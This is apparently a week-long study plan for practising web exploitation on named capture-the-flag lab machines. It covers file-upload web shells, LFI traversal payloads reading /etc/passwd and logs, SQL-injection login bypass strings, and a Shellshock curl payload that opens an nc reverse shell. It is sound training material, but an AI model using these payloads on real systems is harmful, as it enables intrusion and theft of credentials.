# 🌐 Week 6: Web Exploitation I — File Uploads, LFI, Auth Bypass

> _"Web apps are where the users are. And where the users are... the bugs are."_  
> This week is all about breaking into web servers through **upload vulnerabilities**, **directory traversal**, and **authentication logic flaws**.

---

## 🎯 Objectives

- Identify and exploit **file upload vulnerabilities**
    
- Exploit **LFI (Local File Inclusion)** and **directory traversal**
    
- Bypass **login forms**, exploit logic bugs or use common bypass tricks
    
- Practice chaining recon + web enumeration into real shells
    
- Learn how to identify weak or default configurations in HTTP services
    

---

## 🛠 Tools to Master

|Tool|Purpose|
|---|---|
|`ffuf`, `gobuster`|Directory fuzzing|
|`burpsuite`|Manual web request manipulation|
|`whatweb`, `wappalyzer`|Web tech fingerprinting|
|`curl`, `wget`|Pull files and test endpoints|
|`php-reverse-shell.php`|Common reverse shell payload|
|`nc`, `python3 -m http.server`|Listener & hosting payloads|

---

## 💻 Capstone Machines

|Machine|Concepts Covered|
|---|---|
|**Shocker**|Exploit CGI for RCE|
|**Nineveh**|File upload vulnerability & bypass|
|**Traverxec**|LFI and misconfigured HTTP server|

---

## 🗓 Daily Breakdown

---

### 📅 Monday – Web Server Enumeration

#### ✅ Objectives:

- Use automated and manual tools to fingerprint HTTP services
    
- Fuzz for directories, admin panels, upload points
    

#### 🔧 Tasks:

bash

CopyEdit

`whatweb http://<IP> ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt curl -I http://<IP>`

- Use `burpsuite` to intercept logins or POST forms
    
- Look for admin panels, login pages, dev endpoints
    

#### 📄 Deliverables:

- `web-recon.md` with a summary of target’s web layout
    

---

### 📅 Tuesday – File Upload Exploits

#### ✅ Objectives:

- Find upload forms and test extension filtering
    
- Upload web shell (PHP, ASPX)
    

#### 🔧 Tasks:

- Try uploading:
    
    - `shell.php`
        
    - `shell.php.jpg`
        
    - `shell.phtml`
        
- Bypass content-type checks in Burp if needed
    
- Trigger shell with:
    

bash

CopyEdit

`http://<IP>/uploads/shell.php?cmd=id`

- Set up listener:
    

bash

CopyEdit

`nc -lvnp 4444`

#### 📄 Deliverables:

- Screenshot of web shell trigger + reverse shell
    
- Notes on how the bypass worked
    

---

### 📅 Wednesday – Local File Inclusion (LFI)

#### ✅ Objectives:

- Identify pages that use `?file=` or `?page=`
    
- Exploit path traversal to read sensitive files
    

#### 🔧 Tasks:

- Try payloads like:
    

perl

CopyEdit

`http://<IP>/?page=../../../../etc/passwd http://<IP>/?file=../../../../../../var/log/apache2/access.log`

- Use LFI to:
    
    - View logs
        
    - Inject PHP via log poisoning (if possible)
        
    - Read credentials/config files
        

#### 📄 Deliverables:

- Proof of file reads
    
- Report on what was accessible
    

---

### 📅 Thursday – Authentication Bypass Techniques

#### ✅ Objectives:

- Practice logic flaws and form tampering
    

#### 🔧 Tasks:

- Try common payloads:
    
    - `' OR '1'='1`
        
    - `' OR 1=1--`
        
    - `admin'--`
        
- Use Burp to:
    
    - Replay POST requests
        
    - Remove headers (like X-Forwarded-For)
        
    - Bypass client-side restrictions
        
- Look for:
    
    - Default creds (admin/admin)
        
    - Passwords in JavaScript or comments
        
    - Login rate limiting
        

#### 📄 Deliverables:

- Successful bypass proof
    
- Explanation of how it worked
    

---

### 📅 Friday – Root Shocker

#### ✅ Objectives:

- Exploit CGI scripts vulnerable to Shellshock
    

#### 🔧 Tasks:

- Fuzz `/cgi-bin/`:
    

bash

CopyEdit

`gobuster dir -u http://<IP>/cgi-bin/ -w common-cgi.txt`

- Craft payload in Burp or `curl`:
    

bash

CopyEdit

`curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "nc <IP> 4444 -e /bin/bash"' http://<IP>/cgi-bin/status`

- Catch shell with `nc`
    

#### 📄 Deliverables:

- `shocker-report.md` with payloads and shell output
    

---

### 📅 Saturday – Root Nineveh & Traverxec

#### ✅ Objectives:

- Apply upload and LFI techniques in real-world boxes
    

#### 🔧 Tasks:

- Nineveh:
    
    - Upload shell via web UI
        
    - Bypass validation
        
- Traverxec:
    
    - Exploit LFI to read sensitive files
        
    - Use `user.txt` and privesc via config
        

#### 📄 Deliverables:

- `nineveh-report.md`
    
- `traverxec-report.md`
    

---

### 📅 Sunday – Weekly Review + Web Cheatsheet

#### ✅ Objectives:

- Build reusable web attack checklist
    
- Reflect on weaknesses and solidify knowledge
    

#### 🔧 Tasks:

- Create:
    
    - `web-cheatsheet.md` (upload bypasses, LFI payloads, common creds)
        
    - `notes.md`
        
    - Update `ego-log.md`
        

---

## ✅ End-of-Week Checklist

-  Rooted Shocker, Nineveh, Traverxec
    
-  Successfully bypassed at least one upload filter
    
-  Used LFI to read `/etc/passwd` or log file
    
-  Auth bypass tested and documented
    
-  3 reports written with screenshots + payloads
    
-  Cheatsheet + ego-log updated